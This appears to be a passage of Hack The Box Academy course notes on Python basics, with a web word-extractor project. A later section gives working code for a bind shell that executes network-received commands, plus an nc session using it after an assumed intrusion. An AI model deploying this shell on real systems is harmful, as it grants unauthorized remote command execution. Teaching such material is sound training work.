+&gt;&gt;&gt; print('Hello Academy!')
+Hello Academy!
+&gt;&gt;&gt; exit(0)
+</code></pre>
+<p>When evaluating an expression, the result will be printed on the line below if a result is returned. However, if the expression is stored as a variable, nothing will be printed as nothing is returned.</p>
+<p>Python executes the code from the top to the bottom. Python has no clue what is further down in the script until it gets to it. If you were to print a variable instead of a literal value, it must be defined before referencing.</p>
+<pre><code class="language-python">&gt;&gt;&gt; greeting = 'Hello again, Academy'
+&gt;&gt;&gt; print(greeting)
+Hello again, Academy
+</code></pre>
+<h4 id="shebang-"><a class="header" href="#shebang-">Shebang #!</a></h4>
+<p>Another method is based on adding the shebang (<code>#!/usr/bin/env python3</code>) in the first line of a Python script. On Unix based OSs, marking this with a pound sign and an exclamation mark causes the following command to be executed along with all of the specified arguments when the program is called. You can give the Python script execution rights and execute it directly without entering <code>python</code> at the beginning on the command line. The file name is then passed as an argument.</p>
+<p>Example:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+
+print("Hello Academy!")
+</code></pre>
+<pre><code class="language-bash">d41y@htb[/htb]$ chmod +x welcome.py
+d41y@htb[/htb]$ ./welcome.py
+
+Hello Academy!
+</code></pre>
+<h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
+<p>Example:</p>
+<pre><code class="language-python">advice = "Don't panic"
+ultimate_answer = 42
+potential_question = 6 * 7
+confident = True
+something_false = False
+problems = None
+# Oh, and by the way, this is a comment. We can tell by the leading # sign.
+</code></pre>
+<h3 id="strings"><a class="header" href="#strings">Strings</a></h3>
+<p>Strings in Python can be specified using both <code>"</code> and <code>'</code>. When typing out strings that contain either symbol as a natural part of the string itself, it is a good idea to use the other kind of quotes.</p>
+<h3 id="format-strings"><a class="header" href="#format-strings">Format Strings</a></h3>
+<pre><code class="language-python">equation = f'The meaning of life might be {6 * 7}.'  # -&gt; The meaning of life might be 42.
+
+me = 'Birb'
+greeting = f'Hello {me}!'  # -&gt; Hello Birb!
+</code></pre>
+<p>A format string is a string that lets you populate the string with values during runtime.</p>
+<h3 id="integers"><a class="header" href="#integers">Integers</a></h3>
+<h3 id="booleans"><a class="header" href="#booleans">Booleans</a></h3>
+<p>A boolean value is a truth value and can either be <code>True</code> or <code>False</code>. <code>None</code> is a special "nothingness" of a value similar to <code>null</code> in other languages. The usefulness of this value is, that it allows you to define variables in the code but not give them a concrete value just yet. It also allows you to create a more meaningful program flow and decide to pass along either some data or <code>None</code> in case of errors. Moreover, it allows you to return it as a value if "none of something" was found.</p>
+<h3 id="comments"><a class="header" href="#comments">Comments</a></h3>
+<p>Comments work the same way in Python as they do in all other languages: they are ignored when the program runs and are only for the developers' eyes. It can sometimes be advisible to use comments to remember what a piece of code does or explain some oddity. However, it is strongly recommended to write clean and simple code that will not need further explanation other than the code itself.</p>
+<h2 id="coding-style"><a class="header" href="#coding-style">Coding Style</a></h2>
+<p>In Python, variable names follow the snake_case naming convention. This means that variable names should be all lower case initially, and an underscore should separate any potential need for multiple words in the name. While ignoring these naming conventions will not cause any issues for the script, other Python developers may get thrown off if they expect one set of rules but face others.</p>
+<h2 id="conditional-statements--loops"><a class="header" href="#conditional-statements--loops">Conditional Statements / Loops</a></h2>
+<h3 id="if-elif-else"><a class="header" href="#if-elif-else">if-(elif)-else</a></h3>
+<pre><code class="language-python">happy = True
+
+if happy:
+    print("Happy and we know it!")
+else:
+    print("Not happy...")
+</code></pre>
+<p>Python does not require how wide each indentation must be, as long as there is consistency.</p>
+<p>Besides indentations, <code>if</code> and <code>else</code> are introduced. First, you define a variable, which is currently <code>True</code>. Then you check <code>if</code> the variable <code>happy</code> is <code>True</code>, and if it is, then you print "Happy and we know it!" to the terminal. If <code>happy</code> is <code>False</code>, then the <code>else</code> block is executed instead, and "Not happy..." is printed to the terminal.</p>
+<p>You also have to consider the situation that you want to bring in more than just two different options. The <code>elif</code> expression means that you continue with this one if the previous condition is not met. Basically, <code>elif</code> is the shorthand notation of nested <code>if</code> statements.</p>
+<p>Example:</p>
+<pre><code class="language-python">happy = 2
+
+if happy == 1:
+    print("Happy and we know it!")
+elif happy == 2:
+    print("Excited about it!")
+else:
+    print("Not happy...")
+</code></pre>
+<h3 id="while"><a class="header" href="#while">while</a></h3>
+<pre><code class="language-python">counter = 0
+
+while counter &lt; 5:
+    print(f'Hello #{counter}')
+    counter = counter + 1
+</code></pre>
+<p>A while-loop is a loop that will execute its content as long as the defined condition is <code>True</code>. This means that <code>while True</code> will run forever, and <code>while False</code> will never run.</p>
+<p>Output:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ vim loop1.py
+d41y@htb[/htb]$ python3 loop1.py
+
+Hello #0
+Hello #1
+Hello #2
+Hello #3
+Hello #4
+</code></pre>
+<h3 id="for-each-loop"><a class="header" href="#for-each-loop">for-each-loop</a></h3>
+<pre><code class="language-python">groceries = ['Walnuts', 'Grapes', 'Bird seeds']
+
+for food in groceries:
+    print(f'I bought some {food} today.')
+</code></pre>
+<p>The for-each loop is structured this way: first the <code>for</code> keyword, then the variable name you choose, followed by the <code>in</code> keyword and a collection to iterate over.</p>
+<h2 id="functions"><a class="header" href="#functions">Functions</a></h2>
+<p>... let you define code blocks that perform a range of actions, produce a range of values, and optionally return one or more of these values.</p>
+<p>In Python, you can define and call functions to reuse code and work with your data more efficiently.</p>
+<p>Example:</p>
+<pre><code class="language-python">def f(x):
+    return 2 * x + 5
+</code></pre>
+<p>The <code>def</code> keyword is how you define functions in Python. Following <code>def</code> comes the function name, input parameters inside the parantheses, and a colon. The first line of a function is called the signature of the function.</p>
+<h3 id="function-call"><a class="header" href="#function-call">Function Call</a></h3>
+<pre><code class="language-python">def power_of(x, exponent):
+    return x ** exponent
+
+power_of(4, 2)  		# The function was run, but nothing caught the return value.
+eight = power_of(2, 3)  # Variable "eight" is now equal to two-to-the-power-of-three.
+</code></pre>
+<p>... and:</p>
+<pre><code class="language-python">print('My favourite number is:')
+print(power_of(4, 2))
+</code></pre>
+<p>Here you are calling the function <code>print</code> and giving it first a string as input, and next, you are giving it the result of another function call. At runtime, Python will first execute the first line and then go to the 2nd line and execute the commands from inside out. It will, start by calculating <code>power_of(4, 2)</code> and then use this result as input to the <code>print</code> function.</p>
+<p>Imagine if you were to call a function with ten parameters. Having to remember each parameter is challenging once the amount of parameter increases above two, so in addition to these positiona parameters, Python supports what is called named parameters. While positional parameter require yout to always insert the parameters in the correct order, named parameters let you use whichever order you prefer. However, they require you to specify which value goes to which parameter explicitly.</p>
+<p>Example:</p>
+<pre><code class="language-python">def print_sample_invitation(mother, father, child, teacher, event):
+
+    # Notice here the use of a multi-line format-string: f''' text here '''
+    sample_text = f'''
+Dear {mother} and {father}.
+{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 
+
+Best regards,
+Principal G. Sturgis.
+'''
+    print(sample_text)
+
+print_sample_invitation() # error because you did not provide any arguments for the print_sample_invitation function
+</code></pre>
+<p>Usage:</p>
+<pre><code class="language-python">print_sample_invitation(mother='Karen', father='John', child='Noah', teacher='Tina', event='Pizza Party')
+</code></pre>
+<h2 id="oop"><a class="header" href="#oop">OOP</a></h2>
+<p>Cooking recipes and classes are much alike because they define how a dish - or some object - is produced. A cake might have a fixed amount of flour and water, but leave it up to the chef to add chocolate or strawberry frosting. A class is a spec of how an object of some type is produced. The result of instantiating such a class is an object of the class.</p>
+<p>Example:</p>
+<pre><code class="language-python">class DreamCake:
+    # Measurements are defined in grams or units
+    eggs = 4
+    sugar = 300 
+    milk = 200
+    butter = 50
+    flour = 250
+    baking_soda = 20
+    vanilla = 10
+
+    topping = None
+    garnish = None
+
+    is_baked = False
+
+    def __init__(self, topping='No topping', garnish='No garnish'):
+        self.topping = topping
+        self.garnish = garnish
+    
+    def bake(self):
+        self.is_baked = True
+
+    def is_cake_ready(self):
+        return self.is_baked
+</code></pre>
+<p>Classes are defined using the <code>class</code> keyword, followed by the name of the class, in the CapWords naming convention.</p>
+<p>Notice the <code>self</code> parameter at the <code>__init__</code> function. This parameter is a mandatory, first parameter of all class functions. Classes need a way to refer to their own variables and functions. Python is designed to require a <code>self</code> parameter in the first position of the function signature. You can refer to other functions within class functions by calling <code>self.other_func()</code> or <code>self.topping</code>.</p>
+<p>Another little trick to notice is the default values for function parameters. These allow you to completely commit specifying a value for one or more of the parameters. The parameters will then be set to their default values as specified unless overridden when you create an object.</p>
+<h2 id="libraries"><a class="header" href="#libraries">Libraries</a></h2>
+<p>... are collections of knowledge that you can borrow in your projects without reinventing the wheel. Once you import a library, you can use everything inside it, including functions and classes.</p>
+<p>Example:</p>
+<pre><code class="language-python">import datetime
+
+now = datetime.datetime.now()
+print(now)  # Prints: 2021-03-11 17:03:48.937590
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-tip">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  tip
+</p>
+<p>You can use the <code>as</code> statement to give the imported library a new name.<br><br>
+Example:<br>
+<code>from datetime import datetime as dt</code></p>
+</div>
+<h3 id="managing-libraries"><a class="header" href="#managing-libraries">Managing Libraries</a></h3>
+<p>The most popular way of installing external packages in python is by using <code>pip</code>. With pip, you can install, uninstall and upgrade Python packages.</p>
+<p>Installing example:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ # Syntax: python3 -m pip install [package]
+d41y@htb[/htb]$ python3 -m pip install flask
+
+Collecting flask
+  Using cached Flask-1.1.2-py2.py3-none-any.whl (94 kB)
+Collecting Werkzeug&gt;=0.15
+  Using cached Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
+Collecting itsdangerous&gt;=0.24
+  Using cached itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
+Collecting click&gt;=5.1
+  Using cached click-7.1.2-py2.py3-none-any.whl (82 kB)
+Collecting Jinja2&gt;=2.10.1
+  Downloading Jinja2-2.11.3-py2.py3-none-any.whl (125 kB)
+     |████████████████████████████████| 125 kB 7.0 MB/s 
+Collecting MarkupSafe&gt;=0.23
+  Downloading MarkupSafe-1.1.1-cp39-cp39-macosx_10_9_x86_64.whl (16 kB)
+Installing collected packages: Werkzeug, itsdangerous, click, MarkupSafe, Jinja2, flask
+Successfully installed Jinja2-2.11.3 MarkupSafe-1.1.1 Werkzeug-1.0.1 click-7.1.2 flask-1.1.2 itsdangerous-1.1.0
+</code></pre>
+<p>Upgrading example:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ python3 -m pip install --upgrade flask
+
+Requirement already up-to-date: flask in /usr/local/lib/python3.9/site-packages (1.1.2)
+Requirement already satisfied, skipping upgrade: itsdangerous&gt;=0.24 in /usr/local/lib/python3.9/site-packages (from flask) (1.1.0)
+Requirement already satisfied, skipping upg...
+&lt;SNIP&gt;
+</code></pre>
+<p>Uninstalling example:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ pip uninstall [package]
+</code></pre>
+<p>To see what is currently installed you can use <code>freeze</code>:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ # Syntax: python3 -m pip freeze [package]
+d41y@htb[/htb]$ python3 -m pip freeze
+
+click==7.1.2
+Flask==1.1.2
+itsdangerous==1.1.0
+Jinja2==2.11.3
+MarkupSafe==1.1.1
+protobuf==3.13.0
+pynput==1.7.3
+pyobjc-core==7.1
+pyobjc-framework-Cocoa==7.1
+pyobjc-framework-Quartz==7.1
+six==1.15.0
+Werkzeug==1.0.1
+</code></pre>
+<p>Pip also supports maintaining packages from a requirements file. This file contains a list of all the required packages needed to run the script successfully.</p>
+<p><code>requirements.txt</code> example:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ cat requirements.txt
+
+flask
+click
+</code></pre>
+<p>Install from <code>requirements.txt</code> example:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ python3 -m pip install -r requirements.txt
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-tip">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  tip
+</p>
+<p>You can also specify which packagen version to install by using <code>==</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>&lt;</code> or <code>&gt;</code>.<br>
+This can be useful, if you know that some package is vulnerable to exploitation at versions x and lower.</p>
+</div>
+<h3 id="importance-of-libraries"><a class="header" href="#importance-of-libraries">Importance of Libraries</a></h3>
+<h4 id="requests"><a class="header" href="#requests">requests</a></h4>
+<p>The <code>requests</code> library is an elegant and simple HTTP library for Python, which allows you to send HTTP/1.1 requests extremely easily.</p>
+<p>Installing:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ python3 -m pip install requests
+
+Collecting requests
+  Downloading requests-2.25.1-py2.py3-none-any.whl (61 kB)
+     |████████████████████████████████| 61 kB 3.8 MB/s
+Collecting chardet&lt;5,&gt;=3.0.2
+  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+     |████████████████████████████████| 178 kB 6.8 MB/s
+Collecting certifi&gt;=2017.4.17
+...SNIP...
+Successfully installed certifi-2020.12.5 chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.3
+</code></pre>
+<p>Once installed, you can import the library into your code.</p>
+<p>The two most useful things to know about the requests library are making HTTP requests, and secondly, it has a <code>Session</code> class, which is useful when you neet to maintain a certain context during your web activity. For example, if you need to keep track of a range of cookies, you could use a <code>Session</code> object.</p>
+<p><code>requests</code> example:</p>
+<pre><code class="language-python">import requests
+
+resp = requests.get('http://httpbin.org/ip')
+print(resp.content.decode())
+
+# Prints:
+# {
+#   "origin": "X.X.X.X"
+# }
+</code></pre>
+<p>This is a simple example of how to perform a GET request to obtain your public IP address. Since the <code>resp.content</code> variable is a byte-string, a string of bytes that may or may not be printable, you have to call <code>decode()</code> on the object. Decoding the byte-string with the <code>decode()</code> function and no parameters tells Python to interpret the bytes as UTF-8 chars, which is the default encoding used when no other encoding is specified. The <code>resp</code> object contains useful information such as the status_code, the numeric HTTP status code of the request you made, and cookies.</p>
+<h4 id="beautifulsoup"><a class="header" href="#beautifulsoup">BeautifulSoup</a></h4>
+<p>This library makes working with HTML a lot easier in Python. BS turns the HTML into Python objects that are much more easier to work with and allows you to analyze the content better programmatically.</p>
+<p>Installing BS:</p>
+<pre><code class="language-python">d41y@htb[/htb]$ python3 -m pip install beautifulsoup4
+
+Collecting beautifulsoup4
+  Downloading beautifulsoup4-4.9.3-py3-none-any.whl (115 kB)
+     |████████████████████████████████| 115 kB ...
+Collecting soupsieve&gt;1.2
+  Downloading soupsieve-2.2-py3-none-any.whl (33 kB)
+Installing collected packages: soupsieve, beautifulsoup4
+Successfully installed beautifulsoup4-4.9.3 soupsieve-2.2
+</code></pre>
+<p>Usage example - html:</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Birbs are pretty&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;p class="birb-food"&gt;&lt;b&gt;Birbs and their foods&lt;/b&gt;&lt;/p&gt;
+&lt;p class="food"&gt;Birbs love:&lt;a class="seed" href="http://seeds" id="seed"&gt;seed&lt;/a&gt;
+   and 
+   &lt;a class="fruit" href="http://fruit" id="fruit"&gt;fruit&lt;/a&gt;&lt;/p&gt;
+ &lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>Usage example - with BS:</p>
+<pre><code class="language-python">from bs4 import BeautifulSoup
+
+html_doc = """ html code goes here """
+soup = BeautifulSoup(html_doc, 'html.parser')
+print(soup.prettify())
+</code></pre>
+<p>... turns into:</p>
+<pre><code class="language-html">&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;
+   Birbs are pretty
+  &lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+  &lt;p class="birb-food"&gt;
+   &lt;b&gt;
+    Birbs and their foods
+   &lt;/b&gt;
+  &lt;/p&gt;
+  &lt;p class="food"&gt;
+   Birbs love:
+   &lt;a class="seed" href="http://seeds" id="seed"&gt;
+    seed
+   &lt;/a&gt;
+   and
+   &lt;a class="fruit" href="http://fruit" id="fruit"&gt;
+    fruit
+   &lt;/a&gt;
+  &lt;/p&gt;
+ &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="project-word-extractor"><a class="header" href="#project-word-extractor">Project: Word Extractor</a></h2>
+<p>First, you need to import the <code>requests</code> library, then you can use it to GET the URL and print it out:</p>
+<pre><code class="language-python">import requests
+
+PAGE_URL = 'http://target:port'
+
+resp = requests.get(PAGE_URL)
+html_str = resp.content.decode()
+print(html_str)
+</code></pre>
+<p>What happens if you misspell the URL:</p>
+<pre><code class="language-python">&gt;&gt;&gt; r = requests.get('http://target:port/missing.html')
+&gt;&gt;&gt; r.status_code
+
+404
+&gt;&gt;&gt; print(r.content.decode())
+
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt;
+        &lt;title&gt;Error response&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Error response&lt;/h1&gt;
+        &lt;p&gt;Error code: 404&lt;/p&gt;
+        &lt;p&gt;Message: File not found.&lt;/p&gt;
+        &lt;p&gt;Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>If you were expecting that the HTML output contains specific elements that you then tried to access and use, your Python program would crash while trying to use things that do not exist.</p>
+<p>Simple fail check:</p>
+<pre><code class="language-python">import requests
+
+PAGE_URL = 'http://target:port'
+
+resp = requests.get(PAGE_URL)
+
+if resp.status_code != 200:
+    print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
+    exit(1)
+
+html_str = resp.content.decode()
+print(html_str)
+</code></pre>
+<p>It is advisible to keep things simple and separate:</p>
+<pre><code class="language-python">import requests
+
+PAGE_URL = 'http://target:port'
+
+def get_html_of(url):
+    resp = requests.get(url)
+
+    if resp.status_code != 200:
+        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
+        exit(1)
+
+    return resp.content.decode()
+
+print(get_html_of(PAGE_URL))
+</code></pre>
+<p>Functionalities to implement are:</p>
+<ul>
+<li>find all words on the page, ignoring the HTML tags and other metadata</li>
+<li>count the occurence of each word and note it down</li>
+<li>sort by occurence</li>
+<li>do something with the most frequently occuring words (<em>print them</em>)</li>
+</ul>
+<p>For the first step to find all words in the HTML while ignoring HTML tags, you can use regex. If you use the <code>get_text()</code> function, you can use the regular expression module <code>re</code> to get some help. This module has a <code>findall</code> function which takes some string of regex and some text as parameters and then returns all occurences in a list. You can use the regex string <code>\w+</code>, which matches all word chars, that is a-z, A-Z, 0-9 and _.</p>
+<pre><code class="language-python">import requests
+import re
+from bs4 import BeautifulSoup
+
+PAGE_URL = 'http://target:port'
+
+def get_html_of(url):
+    resp = requests.get(url)
+
+    if resp.status_code != 200:
+        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
+        exit(1)
+
+    return resp.content.decode()
+
+html = get_html_of(PAGE_URL)
+soup = BeautifulSoup(html, 'html.parser')
+raw_text = soup.get_text()
+all_words = re.findall(r'\w+', raw_text) # creates list of all words from the webpage including duplicates
+</code></pre>
+<p>The next step is to loop through this list and count each word:</p>
+<pre><code class="language-python"># Previous code omitted
+all_words = re.findall(r'\w+', raw_text)
+
+word_count = {}
+
+for word in all_words:
+    if word not in word_count:
+        word_count[word] = 1
+    else:
+        current_count = word_count.get(word)
+        word_count[word] = current_count + 1
+</code></pre>
+<p>The comes sorting:</p>
+<pre><code class="language-python">top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
+</code></pre>
+<p>... and printing top 10 values:</p>
+<pre><code class="language-python">&gt;&gt;&gt; top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
+&gt;&gt;&gt; for i in range(10):
+...    print(top_words[i])
+</code></pre>
+<p>Since it is working now, you can refactor it:</p>
+<pre><code class="language-python">import requests
+import re
+from bs4 import BeautifulSoup
+
+PAGE_URL = 'http://target:port'
+
+def get_html_of(url):
+    resp = requests.get(url)
+
+    if resp.status_code != 200:
+        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
+        exit(1)
+
+    return resp.content.decode()
+
+def count_occurrences_in(word_list):
+    word_count = {}
+
+    for word in word_list:
+        if word not in word_count:
+            word_count[word] = 1
+        else:
+            current_count = word_count.get(word)
+            word_count[word] = current_count + 1
+    return word_count
+
+def get_all_words_from(url):
+    html = get_html_of(url)
+    soup = BeautifulSoup(html, 'html.parser')
+    raw_text = soup.get_text()
+    return re.findall(r'\w+', raw_text)
+
+def get_top_words_from(all_words):
+    occurrences = count_occurrences_in(all_words)
+    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)
+
+all_words = get_all_words_from(PAGE_URL)
+top_words = get_top_words_from(all_words)
+
+for i in range(10):
+    print(top_words[i][0])
+</code></pre>
+<h3 id="word-extractor-improvements"><a class="header" href="#word-extractor-improvements">Word Extractor Improvements</a></h3>
+<h4 id="main-block"><a class="header" href="#main-block">main-Block</a></h4>
+<pre><code class="language-python">if __name__ == '__main__':
+    page_url = 'http://target:port'
+    the_words = get_all_words_from(page_url)
+    top_words = get_top_words_from(the_words)
+
+    for i in range(10):
+        print(top_words[i][0])
+</code></pre>
+<p>Python scripts are executed from top to bottom, even when imported. This means that if somebody were to import your script, the code would run as soon as imported. The typical way to avoid this is to put all the code that does something into the main-block</p>
+<h4 id="accepting-arguments"><a class="header" href="#accepting-arguments">Accepting Arguments</a></h4>
+<p>Example:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3 wordextractor.py --url http://foo.bar/baz
+</code></pre>
+<p>For this, you will need <code>click</code>.</p>
+<p><code>click</code> Example:</p>
+<pre><code class="language-python">import click
+
+@click.command()
+@click.option('--count', default=1, help='Number of greetings.')
+@click.option('--name', prompt='Your name', help='The person to greet.')
+def hello(count, name):
+    for i in range(count):
+        click.echo('Hello %s!' % name)
+
+if __name__ == '__main__':
+    hello()
+</code></pre>
+<p>First of all, there are decorators which, "decorate functions". These are the things about the function definition that starts with an <code>@</code>. You specify the <code>@click.command</code> decorator, indicating that you will have a command-line input for this <code>hello</code> function. Then two <code>@click.option</code> options are specified. In this example, the parameters are pretty straightforward: you have a default for the count, in case that is not specified as a command-line argument, you have <code>help</code> text for the <code>--help</code> output, and you have a <code>prompt</code> parameter. This tells Python to prompt the user for input if no command-line argument is given.</p>
+<p>Lastly, notice all the "main part" of the code does is call the <code>hello()</code> function. Click requires you to call function with these decorators specified to work. Also, notice that the parameter names for the function <code>hello</code> and the input argument names <code>--count</code> and <code>--name</code> match names if you ignore the <code>--</code>.</p>
+<p>Examples:</p>
+<pre><code>C:\Users\Birb&gt; python click_test.py
+
+Your name: Birb
+Hello Birb!
+
+C:\Users\Birb&gt; python click_test.py --name Birb
+
+Hello Birb!
+
+C:\Users\Birb&gt; python click_test.py --name Birb --count 3
+
+Hello Birb!
+Hello Birb!
+Hello Birb!
+
+C:\Users\Birb&gt; python click_test.py --help
+
+Usage: click_test.py [OPTIONS]
+
+Options:
+  --count INTEGER  Number of greetings.
+  --name TEXT      The person to greet.
+  --help           Show this message and exit.
+</code></pre>
+<p>Using <code>click</code> on Word Extractor:</p>
+<pre><code class="language-python">import click
+import requests
+import re
+from bs4 import BeautifulSoup
+
+def get_html_of(url):
+    resp = requests.get(url)
+
+    if resp.status_code != 200:
+        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
+        exit(1)
+
+    return resp.content.decode()
+
+def count_occurrences_in(word_list, min_length):
+    word_count = {}
+
+    for word in word_list:
+        if len(word) &lt; min_length:
+            continue
+        if word not in word_count:
+            word_count[word] = 1
+        else:
+            current_count = word_count.get(word)
+            word_count[word] = current_count + 1
+    return word_count
+
+def get_all_words_from(url):
+    html = get_html_of(url)
+    soup = BeautifulSoup(html, 'html.parser')
+    raw_text = soup.get_text()
+    return re.findall(r'\w+', raw_text)
+
+def get_top_words_from(all_words, min_length):
+    occurrences = count_occurrences_in(all_words, min_length)
+    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)
+
+@click.command()
+@click.option('--url', '-u', prompt='Web URL', help='URL of webpage to extract from.')
+@click.option('--length', '-l', default=0, help='Minimum word length (default: 0, no limit).')
+def main(url, length):
+    the_words = get_all_words_from(url)
+    top_words = get_top_words_from(the_words, length)
+
+    for i in range(10):
+        print(top_words[i][0])
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<h2 id="project-simple-bind-shell"><a class="header" href="#project-simple-bind-shell">Project: Simple Bind Shell</a></h2>
+<p>Upon gaining access to an internal web service with the credentials you generated, you can get remote code execution on the web host. Trying to use your go-to reverse shell mysteriously does not seem to work, but you discover that you can execute arbitrary python scripts.</p>
+<p>A bind shell is at its core reasonably simple. It is a process that binds to an address and port on the host machine and then listens for incoming connections to the socket. When a connection is made, the bind shell will repeatedly listen for bytes being sent to it and treat them as raw commands to be executed on the system in a subprocess. Once it has received all bytes in chunks of some size, it will run the command on the host system and send back the output.</p>
+<pre><code class="language-python">import socket
+import subprocess
+import click
+
+def run_cmd(cmd):
+    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    return output.stdout
+
+@click.command()
+@click.option('--port', '-p', default=4444)
+def main(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', port))
+    s.listen(4)
+    client_socket, address = s.accept()
+
+    while True:
+        chunks = []
+        chunk = client_socket.recv(2048)
+        chunks.append(chunk)
+        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
+            chunk = client_socket.recv(2048)
+            chunks.append(chunk)
+        cmd = (b''.join(chunks)).decode()[:-1]
+
+        if cmd.lower() == 'exit':
+            client_socket.close()
+            break
+
+        output = run_cmd(cmd)
+        client_socket.sendall(output)
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<p>The code consists of two functions: a wrapper function for executing commands on the system and one main function that contains all the logic thrown into one place. This is less than ideal. The main function sets up a socket, binds it to <code>0.0.0.0</code> and the desired port. It is then configured to allow at most four unaccepted connections before it starts refusing connections anymore - the <code>listen</code> function configures this. The socket then accepts new incoming connections. This is a so-call blocking call, which means the code will halt at this line of code and wait for a connection to be made. When a connection is established, the accept call returns two things that you store in the variables <code>client_socket</code> and <code>address</code>.</p>
+<p>Inside the while-loop:</p>
+<ul>
+<li>receive all of the incoming bytes from the connected client</li>
+<li>convert the incoming bytes to a <code>cmd</code> string</li>
+<li>close down the connection if <code>cmd</code> is "exit"</li>
+<li>otherwise execute the command locally and send back the output</li>
+</ul>
+<p>Starting the Bind Shell:</p>
+<pre><code>C:\Users\Birb\Desktop\python&gt; python bindshell.py --port 4444
+</code></pre>
+<p>Connecting to the Bind Shell:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nc 10.10.10.10 4444 -nv
+
+(UNKNOWN) [10.10.10.10] 4444 (?) open
+
+whoami
+localnest\birb
+
+hostname
+LOCALNEST
+
+dir 
+Volume in drive C has no label.
+ Volume Serial Number is 966B-6E6A
+
+ Directory of C:\Users\Birb\Desktop\python
+
+20-03-2021  21:22    &lt;DIR&gt;          .
+20-03-2021  21:22    &lt;DIR&gt;          ..
+20-03-2021  21:22               929 bindshell.py
+               1 File(s)            929 bytes
+               2 Dir(s)  518.099.636.224 bytes free
+exit
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-note">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  note
+</p>
+<p>The downside of the current implementation is that once you disconnected, the bind shell process stops. One way to fix this is to introduce threads and have the command execution part of the code run in a thread.</p>
+</div>
+<p>Supporting multiple connections:</p>
+<pre><code class="language-bash">import socket
+import subprocess
+import click
+from threading import Thread
+
+def run_cmd(cmd):
+    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    return output.stdout
+
+def handle_input(client_socket):
+    while True:
+        chunks = []
+        chunk = client_socket.recv(2048)
+        chunks.append(chunk)
+        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
+            chunk = client_socket.recv(2048)
+            chunks.append(chunk)
+        cmd = (b''.join(chunks)).decode()[:-1]
+
+        if cmd.lower() == 'exit':
+            client_socket.close()
+            break
+
+        output = run_cmd(cmd)
+        client_socket.sendall(output)
+
+@click.command()
+@click.option('--port', '-p', default=4444)
+def main(port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', port))
+    s.listen(4)
+
+    while True:
+        client_socket, _ = s.accept()
+        t = Thread(target=handle_input, args=(client_socket, ))
+        t.start()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<h2 id="advanced-libraries"><a class="header" href="#advanced-libraries">Advanced Libraries</a></h2>
+<p>Packages physically exist in a predetermined location so that the Python interpreter can locate the packages when you try to import them or elements from inside them. The default location is the <code>site-packages</code> directory. This is true for Windows systems, however on Debian and Debian-based systems the external libraries are located inside a <code>dist-packages</code> location.</p>
+<ul>
+<li>Windows
+<ul>
+<li><code>C:\Program Files\Python38\Lib\site-packages</code></li>
+</ul>
+</li>
+<li>Linux
+<ul>
+<li><code>/usr/lib/python3/dist-packages</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="directories-and-search-paths"><a class="header" href="#directories-and-search-paths">Directories and Search Paths</a></h3>
+<p>Instead of producing a fully functional script for scraping words off a website, you decided to write the script as an API. You could package the script together with an <code>__init__.py</code> file and replace the package inside the site-packages directory. Python already knows to check this location when searching for packages. This is not always practical. However, you can tell Python to look in a different directory before searching through the site-packages directory by specifying the <code>PYTHONPATH</code> environment variable.</p>
